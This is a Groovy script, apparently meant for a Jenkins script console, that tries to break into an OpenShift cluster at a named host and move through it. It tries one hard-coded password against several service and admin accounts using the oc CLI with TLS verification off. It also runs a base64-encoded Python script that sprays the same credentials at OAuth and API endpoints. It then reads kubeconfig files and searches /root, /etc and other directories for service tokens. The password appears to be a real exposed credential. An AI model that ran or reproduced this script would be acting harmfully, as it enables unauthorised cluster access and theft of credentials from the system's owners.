// Login a OpenShift y enumerar namespaces/pods via oc CLI o API REST
// Cluster: https://console.dev.amxnova.net:8443

// Primero verificar que oc está instalado
def exec = { cmd ->
    def proc = cmd.execute()
    def out = new StringBuilder()
    def err = new StringBuilder()
    proc.consumeProcessOutput(out, err)
    proc.waitForOrKill(30000)
    return [out: out.toString(), err: err.toString(), exitCode: proc.exitValue()]
}

println "=== OC CLI CHECK ==="
def ocPaths = ["/usr/bin/oc", "/usr/local/bin/oc", "/opt/oc/bin/oc", "oc"]
def ocBin = null
ocPaths.each { p ->
    def result = exec(["bash", "-c", "which ${p} 2>/dev/null || ls -la ${p} 2>/dev/null"])
    if (result.exitCode == 0 && result.out.trim()) {
        println "FOUND oc at: ${p} -> ${result.out.trim()}"
        ocBin = p
    }
}

// También buscar en PATH
def pathResult = exec(["bash", "-c", "which oc 2>&1; oc version 2>&1 || echo 'oc not found'"])
println "OC PATH: ${pathResult.out}"

// Si oc no está disponible, usar curl a la API REST de OpenShift
println "\n=== OC LOGIN ATTEMPTS ==="

// Método 1: oc login con sophia-mrk-i
if (ocBin || pathResult.out.contains("/")) {
    def oc = ocBin ?: "oc"
    def loginAttempts = [
        ["${oc}", "login", "https://console.dev.amxnova.net:8443", "-u", "sophia-mrk-i", "-p", "plug*spoke!MosqueCloud3col", "--insecure-skip-tls-verify=true"],
        ["${oc}", "login", "https://console.dev.amxnova.net:8443", "-u", "cs-jenkins-deployer", "-p", "plug*spoke!MosqueCloud3col", "--insecure-skip-tls-verify=true"],
        ["${oc}", "login", "https://console.dev.amxnova.net:8443", "-u", "jenkins", "-p", "plug*spoke!MosqueCloud3col", "--insecure-skip-tls-verify=true"],
    ]
    loginAttempts.each { cmd ->
        println "\nTrying: ${cmd[3]} ${cmd[4]}"
        def r = exec(cmd)
        println "OUT: ${r.out}"
        println "ERR: ${r.err}"
        if (r.exitCode == 0) {
            println "LOGIN SUCCESS!"
        }
    }
}

// Método 2: API REST de OpenShift - obtener token via oauth
println "\n=== REST API OAUTH TOKEN ==="
def pyOAuth = '''
import urllib.request, urllib.parse, ssl, base64, json

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

BASE = "https://console.dev.amxnova.net:8443"
creds = [
    ("sophia-mrk-i", "plug*spoke!MosqueCloud3col"),
    ("cs-jenkins-deployer", "plug*spoke!MosqueCloud3col"),
    ("jenkins", "plug*spoke!MosqueCloud3col"),
    ("admin", "plug*spoke!MosqueCloud3col"),
]

for user, pwd in creds:
    try:
        # Try OAuth token endpoint
        auth = base64.b64encode(f"{user}:{pwd}".encode()).decode()
        req = urllib.request.Request(
            f"{BASE}/oauth/token/request",
            headers={
                "Authorization": f"Basic {auth}",
                "Accept": "application/json",
                "Content-Type": "application/x-www-form-urlencoded"
            }
        )
        r = urllib.request.urlopen(req, timeout=10, context=ctx)
        data = r.read().decode()
        print(f"[{user}] TOKEN ENDPOINT: {r.status} - {data[:500]}")
    except Exception as e:
        print(f"[{user}] OAuth error: {e}")
    
    try:
        # Also try basic API auth
        req2 = urllib.request.Request(
            f"{BASE}/oapi/v1/projects",
            headers={
                "Authorization": f"Basic {auth}",
                "Accept": "application/json"
            }
        )
        r2 = urllib.request.urlopen(req2, timeout=10, context=ctx)
        data2 = r2.read().decode()
        print(f"[{user}] PROJECTS: {r2.status} - {data2[:500]}")
    except urllib.error.HTTPError as e:
        print(f"[{user}] PROJECTS HTTP {e.code}: {e.read().decode()[:200]}")
    except Exception as e:
        print(f"[{user}] PROJECTS error: {e}")
'''
def encPy = pyOAuth.bytes.encodeBase64().toString()
def pyResult = exec(["bash", "-c", "echo '${encPy}' | base64 -d > /tmp/oc_oauth.py && python3 /tmp/oc_oauth.py 2>&1"])
println pyResult.out
println pyResult.err

// Método 3: Usar token del servicio sophia si ya hay uno en ~/.kube/config
println "\n=== CHECK EXISTING KUBE/OC CONFIG ==="
def checkKube = exec(["bash", "-c", "cat ~/.kube/config 2>/dev/null || cat ~/.oc/config 2>/dev/null || echo 'NO CONFIG'"])
println checkKube.out

// Método 4: Buscar tokens de servicio en el sistema (dentro del nodo jenkins)
println "\n=== SEARCH SERVICE ACCOUNT TOKENS ==="
def findTokens = exec(["bash", "-c", "find /var /tmp /home /root /etc -name 'token' -o -name '*.token' -o -name 'kubeconfig' -o -name '.kube' 2>/dev/null | head -20"])
println findTokens.out

println "\n=== FIN OC LOGIN ==="
